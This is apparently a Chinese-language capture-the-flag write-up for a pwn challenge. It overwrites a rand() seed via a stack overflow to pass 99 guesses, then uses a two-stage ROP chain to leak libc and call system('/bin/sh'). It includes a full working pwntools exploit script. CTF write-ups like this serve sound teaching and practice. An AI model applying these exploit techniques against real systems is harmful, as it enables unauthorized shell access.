# Elden Random Challenge

## 题目简述

程序先要求连续完成 99 次伪随机数猜测，随后进入一个可利用的栈溢出流程。输入姓名时不仅能覆盖栈数据，还能把随机数种子覆盖为固定值；因此可以在本地调用与远端一致的 glibc `rand()`，复现服务端的随机数序列。通过随机数阶段后，再利用栈溢出泄露 libc 地址并执行常规 `ret2libc`。

## 解题过程

### 固定并预测随机数

姓名缓冲区后方存放随机数种子。使用 `b"a" * 0xe + p32(0)` 将种子覆盖为 0，再让本地 glibc 执行 `srand(0)`。题目每轮使用 `rand() % 100 + 1`，所以本地生成的 99 个结果就是服务端期待的答案。

这里必须使用与服务端相同实现、相同版本的 libc；C 标准并不保证不同 libc 的 `rand()` 序列一致。

### 泄露 libc 并返回 `system`

随机数校验结束后，溢出点到返回地址的偏移为 `0x38`。第一段 ROP 调用 `puts(puts@got)` 泄露 `puts` 的运行时地址，并返回读取函数继续接收第二段载荷。由泄露值减去 `puts` 符号偏移得到 libc 基址，然后调用 `system("/bin/sh")`。

整理后的利用脚本如下，其中地址来自官方题解所用二进制，`HOST`、`PORT` 需要替换为实际环境：

```python
from ctypes import CDLL

from pwn import ELF, context, p32, p64, remote, u64

context.arch = "amd64"

HOST = "challenge.host"
PORT = 9999

io = remote(HOST, PORT)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
rand_libc = CDLL("./libc.so.6")

pop_rdi_ret = 0x401423
ret = 0x40101A
read_again = 0x40125D

# 覆盖服务端随机数种子，并在本地复现相同状态。
io.sendafter(b"Menlina: Well tarnished, tell me thy name.", b"a" * 0xE + p32(0))
rand_libc.srand(0)
for _ in range(99):
    guess = rand_libc.rand() % 100 + 1
    io.sendafter(b"Please guess the number:", p64(guess))

# 第一阶段：泄露 puts 地址。
payload = b"a" * 0x38
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(read_again)
io.sendafter(b"Here's a reward to thy brilliant mind.", payload)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]

# 第二阶段：system("/bin/sh")。
payload = b"a" * 0x38
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])
io.sendline(payload)
io.interactive()
```

验证时，99 次猜测全部通过后程序会输出奖励提示；随后泄露地址以 `0x7f` 结尾，计算出的 libc 基址应按页对齐，第二段 ROP 最终进入交互式 shell。

## 方法总结

- 核心技巧：覆盖 PRNG 种子并用相同 libc 预测 `rand()`，再通过两阶段 ROP 完成 `ret2libc`。
- 识别信号：随机数校验前存在可越界输入，而且种子与输入缓冲区位于相邻内存区域。
- 复用要点：预测 C 库 PRNG 时必须匹配实现和版本；泄露 libc 后要检查基址页对齐，并在调用 `system` 前用单独的 `ret` 调整栈对齐。
